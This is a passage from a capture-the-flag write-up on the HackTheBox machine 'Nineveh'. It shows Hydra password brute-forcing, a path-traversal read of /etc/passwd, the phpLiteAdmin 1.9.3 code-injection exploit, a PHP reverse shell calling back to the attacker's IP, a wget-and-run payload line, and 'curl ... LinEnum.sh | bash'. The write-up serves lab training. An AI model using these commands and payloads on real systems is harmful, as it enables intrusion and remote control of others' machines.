+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">05</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">58</span><span class="err">:</span><span class="mi">00</span><span class="w"></span>
+</pre></div>
+
+
+<p>after few minutes I found the password and I got this page after logging in:</p>
+<p><img alt="" src="../images/nineveh-construction.png"></p>
+<p>and if I nagivate to the <strong>Notes</strong> menu I get this:</p>
+<p><img alt="" src="../images/nineveh-notes.png"></p>
+<p>It is important to note the URL of the "Notes" menu which points to a file (ninevehNotes.txt) to read from. I started having a look at potential path traversal vulnerabilty and I after trying few combinations I was able to read the passwd file using this path <strong>../../../../../../../etc/passwd</strong></p>
+<p><img alt="" src="../images/nineveh-traversal.png"></p>
+<p>One strange thing I noticed is that this should be working also without <strong>files/ninevehNotes.txt</strong> string but for some reasons it doesn't. </p>
+<p><img alt="" src="../images/nineveh-traversal-nonote.png"></p>
+<p>In fact, we are getting the message <strong><em>No Note is selected</em></strong> as shown above. After numerous tests I realized there is some kind of filter in the code that if detects the word <strong>ninevehNotes</strong> is missing from the string it throws the message <strong><em>No Note is selected</em></strong> and the LFI does not work.</p>
+<p>Another shorter string I managed to successfully verify is this</p>
+<p><code>http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd</code></p>
+<p>I spent some more time playing around with this but I got nowhere so I left it for the time being and I moved to enumerating on the SSL page.</p>
+<p>I launched gobuster against the https://nineveh.htb which revealed three  directories:</p>
+<div class="highlight"><pre><span></span><span class="err">user@Kali:~$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k</span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1</span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            https://nineveh.htb</span>
+<span class="err">[+] Threads:        50</span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="err">[+] User Agent:     gobuster/3.0.1</span>
+<span class="err">[+] Timeout:        10s</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/18 09:17:58 Starting gobuster</span>
+<span class="err">===============================================================</span>
+<span class="err">/db (Status: 301)</span>
+<span class="err">/server-status (Status: 403)</span>
+<span class="err">/secure_notes (Status: 301)</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/18 09:20:18 Finished</span>
+<span class="err">===============================================================</span>
+</pre></div>
+
+
+<p>After browsing the https://nineveh.htb/db we find ourselves at another login page, this time is for the application phpliteAdmin v1.9</p>
+<p><img alt="" src="../images/nineveh-db.png"></p>
+<div class="highlight"><pre><span></span><span class="err">#</span> <span class="nx">Exploit</span> <span class="nx">Title</span><span class="o">:</span> <span class="nx">phpliteadmin</span> <span class="o">&lt;=</span> <span class="mf">1.9.3</span> <span class="nx">Remote</span> <span class="nx">PHP</span> <span class="nx">Code</span> <span class="nx">Injection</span> <span class="nx">Vulnerability</span>
+<span class="err">#</span> <span class="nx">Google</span> <span class="nx">Dork</span><span class="o">:</span> <span class="nx">inurl</span><span class="o">:</span><span class="nx">phpliteadmin</span><span class="p">.</span><span class="nx">php</span> <span class="p">(</span><span class="nx">Default</span> <span class="nx">PW</span><span class="o">:</span> <span class="nx">admin</span><span class="p">)</span>
+<span class="err">#</span> <span class="nb">Date</span><span class="o">:</span> <span class="mi">01</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2013</span>
+<span class="err">#</span> <span class="nx">Exploit</span> <span class="nx">Author</span><span class="o">:</span> <span class="nx">L</span><span class="err">@</span><span class="nx">usch</span> <span class="o">-</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt</span>
+<span class="err">#</span> <span class="nx">Vendor</span> <span class="nx">Homepage</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//code.google.com/p/phpliteadmin/</span>
+<span class="err">#</span> <span class="nx">Vendor</span> <span class="nx">Status</span><span class="o">:</span> <span class="nx">Informed</span>
+<span class="err">#</span> <span class="nx">Software</span> <span class="nx">Link</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip</span>
+<span class="err">#</span> <span class="nx">Version</span><span class="o">:</span> <span class="mf">1.9.3</span>
+<span class="err">#</span> <span class="nx">Tested</span> <span class="nx">on</span><span class="o">:</span> <span class="nx">Windows</span> <span class="nx">and</span> <span class="nx">Linux</span>
+
+<span class="nx">Description</span><span class="o">:</span>
+
+<span class="nx">phpliteadmin</span><span class="p">.</span><span class="nx">php</span><span class="err">#</span><span class="mi">1784</span><span class="o">:</span> <span class="s1">&#39;Creating a New Database&#39;</span> <span class="p">=&gt;</span> 
+<span class="nx">phpliteadmin</span><span class="p">.</span><span class="nx">php</span><span class="err">#</span><span class="mi">1785</span><span class="o">:</span> <span class="s1">&#39;When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.&#39;</span><span class="p">,</span>
+
+<span class="nx">An</span> <span class="nx">Attacker</span> <span class="nx">can</span> <span class="nx">create</span> <span class="nx">a</span> <span class="nx">sqlite</span> <span class="nx">Database</span> <span class="kd">with</span> <span class="nx">a</span> <span class="nx">php</span> <span class="nx">extension</span> <span class="nx">and</span> <span class="nx">insert</span> <span class="nx">PHP</span> <span class="nx">Code</span> <span class="nx">as</span> <span class="nx">text</span> <span class="nx">fields</span><span class="p">.</span> <span class="nx">When</span> <span class="nx">done</span> <span class="nx">the</span> <span class="nx">Attacker</span> <span class="nx">can</span> <span class="nx">execute</span> <span class="nx">it</span> <span class="nx">simply</span> <span class="nx">by</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">database</span> <span class="nx">file</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">Webbrowser</span><span class="p">.</span>
+
+<span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">:</span>
+
+<span class="mf">1.</span> <span class="nx">We</span> <span class="nx">create</span> <span class="nx">a</span> <span class="nx">db</span> <span class="nx">named</span> <span class="s2">&quot;hack.php&quot;</span><span class="p">.</span>
+<span class="p">(</span><span class="nx">Depending</span> <span class="nx">on</span> <span class="nx">Server</span> <span class="nx">configuration</span> <span class="nx">sometimes</span> <span class="nx">it</span> <span class="nx">will</span> <span class="nx">not</span> <span class="nx">work</span> <span class="nx">and</span> <span class="nx">the</span> <span class="nx">name</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">db</span> <span class="nx">will</span> <span class="nx">be</span> <span class="s2">&quot;hack.sqlite&quot;</span><span class="p">.</span> <span class="nx">Then</span> <span class="nx">simply</span> <span class="k">try</span> <span class="nx">to</span> <span class="nx">rename</span> <span class="nx">the</span> <span class="nx">database</span> <span class="o">/</span> <span class="nx">existing</span> <span class="nx">database</span> <span class="nx">to</span> <span class="s2">&quot;hack.php&quot;</span><span class="p">.)</span>
+<span class="nx">The</span> <span class="nx">script</span> <span class="nx">will</span> <span class="nx">store</span> <span class="nx">the</span> <span class="nx">sqlite</span> <span class="nx">database</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">same</span> <span class="nx">directory</span> <span class="nx">as</span> <span class="nx">phpliteadmin</span><span class="p">.</span><span class="nx">php</span><span class="p">.</span>
+<span class="nx">Preview</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//goo.gl/B5n9O</span>
+<span class="nx">Hex</span> <span class="nx">preview</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//goo.gl/lJ5iQ</span>
+
+<span class="mf">2.</span> <span class="nx">Now</span> <span class="nx">create</span> <span class="nx">a</span> <span class="k">new</span> <span class="nx">table</span> <span class="k">in</span> <span class="k">this</span> <span class="nx">database</span> <span class="nx">and</span> <span class="nx">insert</span> <span class="nx">a</span> <span class="nx">text</span> <span class="nx">field</span> <span class="kd">with</span> <span class="nx">the</span> <span class="k">default</span> <span class="nx">value</span><span class="o">:</span>
+<span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">()</span><span class="cp">?&gt;</span>
+<span class="nx">Hex</span> <span class="nx">preview</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//goo.gl/v7USQ</span>
+
+<span class="mf">3.</span> <span class="nx">Now</span> <span class="nx">we</span> <span class="nx">run</span> <span class="nx">hack</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="nx">Done</span><span class="o">!</span>
+
+<span class="nx">Proof</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//goo.gl/ZqPVL</span>
+</pre></div>
+
+
+<p>Looking for exploits with <strong>searchsploit</strong> I found an interesting one (24044) but, as per the above description, it requires for us to be logged in and create a database. </p>
+<p>Now I use the same bruteforce technique I used earlier with hybra with some small adjustments. Since we don't have a user I can specify anything I want (just left admin). </p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">https</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">post</span><span class="w"> </span><span class="ss">&quot;/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password.&quot;</span><span class="w">  </span><span class="o">-</span><span class="n">t</span><span class="w"> </span>
+<span class="mi">64</span><span class="w"> </span><span class="o">-</span><span class="n">V</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">443</span><span class="w">                                                                                                                                                                                  </span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.0</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="p">.</span><span class="w">                                                               </span>
+
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">43</span><span class="err">:</span><span class="mi">23</span><span class="w">                                                                                                            </span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Restorefile</span><span class="w"> </span><span class="p">(</span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">abort</span><span class="p">...</span><span class="w"> </span><span class="p">(</span><span class="k">use</span><span class="w"> </span><span class="k">option</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">skip</span><span class="w"> </span><span class="n">waiting</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">previous</span><span class="w"> </span><span class="k">session</span><span class="w"> </span><span class="k">found</span><span class="p">,</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">prevent</span><span class="w"> </span><span class="n">overwriting</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">hydra</span><span class="p">.</span><span class="k">restore</span><span class="w">                                </span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">14344399</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">224132</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span><span class="w">                                                                             </span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="nl">forms</span><span class="p">:</span><span class="o">//</span><span class="n">nineveh</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="nl">php</span><span class="p">:</span><span class="n">password</span><span class="o">=^</span><span class="n">PASS</span><span class="o">^&amp;</span><span class="n">remember</span><span class="o">=</span><span class="n">yes</span><span class="o">&amp;</span><span class="n">login</span><span class="o">=</span><span class="nf">Log</span><span class="o">+</span><span class="ow">In</span><span class="o">&amp;</span><span class="n">proc_login</span><span class="o">=</span><span class="k">true</span><span class="err">:</span><span class="n">Incorrect</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="w">                                                 </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;123456&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 0</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">                                                                                                  </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;12345&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">                                                                                                   </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;123456789&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 2</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">                                                      </span>
+<span class="p">.</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;alexia&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1451</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 40</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">443</span><span class="o">][</span><span class="n">http-post-form</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">password123</span><span class="w"></span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span><span class="w"></span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Writing</span><span class="w"> </span><span class="k">restore</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">worker</span><span class="w"> </span><span class="n">threads</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="k">end</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">resolve</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">connected</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">targets</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"></span>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">43</span><span class="err">:</span><span class="mi">54</span><span class="w"></span>
+</pre></div>
+
+
+<p>Now we know the password is <strong>password123</strong> so we can log in:</p>
+<p><img alt="" src="../images/nineveh-phplite.png"></p>
+<p>Let us know try to apply the exploit we found previously (24044).</p>
+<p>The instructions of the exploit state to create a database named hack.php with a table and default value of <strong>&lt;?php phpinfo()?&gt;</strong> so I did as instructed:</p>
+<p><img alt="" src="../images/nineveh-table.png"></p>
+<p>Now, considering we have previously found a path traveral we can try to use the same techique but instead of reading the /etc/passwd file we can read the hack.php file knowing that the path is <strong>/var/tmp/hack.php</strong> from the above screenshots.</p>
+<p><img alt="" src="../images/nineveh-phpinfo.png"></p>
+<p>As expected, because we have an LFI vulnerabiity, I am able to run the phpinfo page using the URL in the screenshot above. Now we can simply replace the code <strong>&lt;?php phpinfo()?&gt;</strong> with a php shell and we should be able to get a shell back.</p>
+<p>I got the following php shell from the Internet where I place my IP and a port (9999 in this case).</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nv">$sock</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;10.10.14.5&quot;</span><span class="p">,</span><span class="mi">9999</span><span class="p">);</span><span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>then I create another database called shell.php using the same procedure I used before from he phplite admin panel and in the default value I add the shell code:</p>
+<p><img alt="" src="../images/nineveh-dbshell.png"></p>
+<p>Then I create a netcat listener on my kali box and when I browse the URL http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../var/tmp/shell.phpand I get the following:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">9999</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9999</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.5</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.43</span><span class="o">]</span><span class="w"> </span><span class="mi">56376</span><span class="w"></span>
+<span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"></span>
+</pre></div>
+
+
+<p>Although the connection seems to work I am unable to get the shell. After several unsuccessful attempts, I changed methodology and instead of placing the shell in the database default value field I place the shell in my kali box and make it available through a python simple http server.</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;wget http://10.10.14.5:8000/shellcode.php -O /tmp/shellcode.php ;php /tmp/shellcode.php&quot;</span><span class="p">);</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>That being said i will use the same procedure but now I will add the above code in the shell.php database default value.</p>
+<p>With this method we finally got a working shell which I upgraded to a full pty shell with the below python command:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@Kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nc -lvnp 9999</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">9999</span> <span class="o">...</span>
+
+
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.5</span><span class="p">]</span> <span class="kn">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.43</span><span class="p">]</span> <span class="mi">56380</span>
+<span class="n">Linux</span> <span class="n">nineveh</span> <span class="mf">4.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">62</span><span class="o">-</span><span class="n">generic</span> <span class="c1">#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ <span class="mo">06</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">38</span> <span class="n">up</span>  <span class="mi">1</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span>  <span class="mi">0</span> <span class="n">users</span><span class="p">,</span>  <span class="n">load</span> <span class="n">average</span><span class="p">:</span> <span class="mf">0.03</span><span class="p">,</span> <span class="mf">0.08</span><span class="p">,</span> <span class="mf">0.04</span>
+<span class="n">USER</span>     <span class="n">TTY</span>      <span class="n">FROM</span>             <span class="n">LOGIN</span><span class="err">@</span>   <span class="n">IDLE</span>   <span class="n">JCPU</span>   <span class="n">PCPU</span> <span class="n">WHAT</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
+<span class="err">$</span> <span class="err">$</span> <span class="err">$</span> 
+<span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span> 
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">4</span><span class="p">:</span> <span class="n">python</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@nineveh</span><span class="p">:</span><span class="o">/</span><span class="err">$</span>
+</pre></div>
+
+
+<p>From the output of the /etc/passwd we know there are 2 users with valid shell, that is <strong>root</strong> and <strong>amrois</strong>.</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@nineveh:/home/amrois$ ls -l</span>
+<span class="err">ls -l</span>
+<span class="err">total 4</span>
+<span class="err">-rw------- 1 amrois amrois 33 Jul  2  2017 user.txt</span>
+</pre></div>
+
+
+<p>The user.txt is there but we can't read it as we are www-data user and we don't have permissions.</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@nineveh:/$ curl http://10.10.14.5:8000/LinEnum.sh| bash</span>
+</pre></div>
+
+
+<p>At this stage I launched the above command which ran the LinEnu.sh script located in my kali box. I did not find anything useful in the output.</p>
+<p>I then had look at the <strong>secure_notes</strong> directory previously with gobuster which sounds interesting. From experience the word <strong>secret</strong> could mean there is something hidden in the hackthebox world.</p>
+<p><img alt="" src="../images/nineveh-secure_notes.png"></p>
+<p>Browsing to the directory I see only the above picture. However, since the directory states <strong>secure_notes</strong> I decided to dig deeper and dowload the picture in my kali box and inspect it with <strong>binwalk</strong>.</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="err">#</span><span class="w"> </span><span class="n">binwalk</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">png</span><span class="w"></span>
+
